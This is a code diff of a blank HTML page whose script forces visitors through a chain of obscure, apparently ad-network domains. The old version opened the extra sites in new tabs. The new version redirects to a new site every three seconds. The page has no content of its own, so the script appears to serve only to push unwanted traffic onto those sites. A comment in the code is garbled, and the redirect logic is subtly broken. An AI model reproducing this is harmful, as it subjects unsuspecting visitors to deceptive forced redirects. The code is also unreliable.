@@ -13,21 +13,35 @@
         'doruffleton.com/4/6210180',
         'potskolu.net/4/6210179',
         'dukingdraon.com/4/6210177',
-        'atservineor.com/4/6210176',
-        'nabauxou.net/4/6195739'
+        'atservineor.com/4/6210176'
       ];
       
-      var mainSite = sites.shift(); // Ïåðâûé ñàéò äëÿ ðåäèðåêòà
-      
-      window.location.href = mainSite;
-      
-      for (var i = 0; i < sites.length; i++) {
-        var site = sites[i];
-        var newTab = window.open(site, '_blank');
+      function redirectToNextSite(index) {
+        if (index < sites.length) {
+          window.location.href = sites[index];
+        } else {
+          redirectToNewSite();
+        }
       }
+      
+      function redirectToNewSite() {
+        window.location.href = 'nabauxou.net/4/6195739';
+      }
+      
+      var currentIndex = 0;
+      
+      var interval = setInterval(function() {
+        redirectToNextSite(currentIndex);
+        currentIndex++;
+        
+        if (currentIndex >= sites.length + 1) {
+          clearInterval(interval);
+        }
+      }, 3000);
     }
   </script>
 </head>
 <body>
 </body>
 </html>
+
